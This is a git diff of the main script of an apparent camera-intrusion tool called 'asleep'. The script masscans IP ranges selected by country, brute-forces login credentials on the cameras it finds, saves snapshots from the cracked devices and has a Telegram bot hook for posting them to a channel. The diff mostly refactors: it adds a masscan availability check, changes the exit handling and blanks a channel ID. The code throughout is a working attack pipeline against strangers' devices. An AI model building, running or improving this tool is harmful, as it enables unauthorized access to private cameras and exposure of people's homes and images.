@@ -3,6 +3,7 @@
 
 import sys, random, requests
 import optparse, platform
+import subprocess
 
 from countrycode import countrycode
 from pyfiglet import Figlet
@@ -12,7 +13,6 @@ from queue import Queue
 from geolocation import IPDenyGeolocationToIP
 from bot import Poster
 from snapshot import *
-# from checker import *
 from export import *
 from utils import *
 from brute import *
@@ -28,10 +28,9 @@ def get_os_type():
 
 
 # TODO: make bruteforce core function
-# TODO: add importlib, python-netsurv, git://dhondta/sploitkit
+# TODO: rewrite with importlib, python-netsurv, git://dhondta/sploitkit
 
 def process_cameras():
-    results = []
     brute_file = config.tmp_masscan_file
     hosts = masscan_parse(brute_file)
     ip_count = len(hosts)
@@ -52,16 +51,9 @@ def process_cameras():
     config.total = len(hosts)
 
     try:
-        #progress.create_bars()
-        # check_queue = Queue()
         brute_queue = Queue()
         screenshot_queue = Queue()
         image_processing_queue = Queue()
-
-        # for _ in range(default_check_threads):
-        #     check_worker = CheckerThread(check_queue, brute_queue)
-        #     check_worker.setDaemon(True)
-        #     check_worker.start()
 
         for _ in range(config.default_brute_threads):
             brute_worker = BruteThread(brute_queue, screenshot_queue)
@@ -81,14 +73,10 @@ def process_cameras():
 
         for host in hosts:
             brute_queue.put(host, block=False, timeout=25)
-        print('\nStarting to brute total ' + str(brute_queue.qsize()) + ' devices\n')
+        print(f'\nStarting to brute total {str(brute_queue.qsize())} devices\n')
 
-        # check_worker.join()
-        # progress.check_bar.close()
         brute_queue.join()
-        #progress.brute_bar.close()
         screenshot_queue.join()
-        #progress.screenshot_bar.close()
         image_processing_queue.join()
         # raise exception here
         print('\n')
@@ -103,7 +91,6 @@ def process_cameras():
 
     logging.info('Results: %s devices found, %s bruted' % (len(hosts), len(config.working_hosts)))
     logging.info('Made total %s snapshots' % (config.snapshots_counts))
-    return results
 
 
 def masscan(filescan, threads, resume):
@@ -115,12 +102,34 @@ def masscan(filescan, threads, resume):
         params = ' -p %s -iL %s -oL %s --rate=%s %s' % (
             ",".join(config.global_ports), filescan, config.tmp_masscan_file, threads, config.additional_masscan_params())
         params += ' --http-user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"'
-    binary = 'sudo ' + config.masscan_nix_path if get_os_type() == 'nix' else config.masscan_windows_path
+    mmasscan_path = config.masscan_nix_path if get_os_type() == 'nix' else config.masscan_windows_path
+    binary = 'sudo ' + mmasscan_path
+
+    try:
+        if sys.platform.startswith('freebsd') \
+                or sys.platform.startswith('linux') \
+                or sys.platform.startswith('darwin'):
+           p = subprocess.Popen(
+                [mmasscan_path, '-V'],
+                bufsize=10000,
+                stdout=subprocess.PIPE,
+                close_fds=True)
+        else:
+             p = subprocess.Popen(
+                  [mmasscan_path, '-V'],
+                  bufsize=10000,
+                  stdout=subprocess.PIPE)
+
+    except OSError:
+           logging.error('Please install Masscan or define \
+full path to binary in .config file.')
+           sys.exit(0)
+
     os.system(binary + params)
     if not os.path.exists(config.tmp_masscan_file):
         logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
                       config.tmp_masscan_file)
-        exit(-1)
+        sys.exit(0)
 
 
 def get_options():
@@ -182,8 +191,8 @@ flag while setting custom ports!')
                 logging.debug(e)
                 continue
             total_range += range_list
-            slash = ["|", "/", " ", "-"]
-            print('Searching for a bright-day ip-ranges ' + random.choice(slash), end="\r")
+            slash = ['|', '/', ' ', '-']
+            print(f'Searching for a bright-day ip-ranges {random.choice(slash)}', end='\r')
             time.sleep(2) # spell from ban
             for cidr in range_list:
                 count2 = IPDenyGeolocationToIP.get_cidr_count(cidr)
@@ -230,17 +239,18 @@ flag while setting custom ports!')
     if not os.path.exists(options.brute_file) and options.brute_only:
         logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
                       % config.tmp_masscan_file)
-        exit(1)
+        sys.exit(0)
 
     if not options.scan_file and not options.brute_only and not options.masscan_resume:
         logging.error("No target file scan list")
         parser.print_help()
-        exit(1)
+        sys.exit(0)
 
     return options
 
 
 def main():
+    get_os_type()
     f = Figlet(font='slant')
     print(f.renderText('asleep')) #+ '\n')
     print('https://t.me/asleep_cg' + '\n')
@@ -253,17 +263,17 @@ def main():
     prepare_folders_and_files()
     if not options.brute_only:
         masscan(options.scan_file, options.threads, options.masscan_resume)
-    results = process_cameras()
-    if not options.no_xml and results:
-        save_xml(results)
-    save_csv(results)
+    process_cameras()
+    if not options.no_xml and len(config.working_hosts) > 0:
+        save_xml(config.working_hosts)
+    save_csv()
     if options.dead_cams:
         hosts = masscan_parse(config.tmp_masscan_file)
         dead_cams(hosts)
 
     # Configs for Telegram Bot:
-    ROOM_ID = '-1001184010916' # Channel ID
-    TOKEN = "" # Bot Token
+    ROOM_ID = '' # Channel ID
+    TOKEN = '' # Bot Token
     SNAPSHOT_DIR = os.path.join(Path.cwd(), config.snapshots_folder)
     """ delete=True removes snapshots after posting """
     #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
@@ -286,4 +296,4 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         print('\n')
         logging.info('Interrupted by user')
-        exit(0)
+        sys.exit(0)
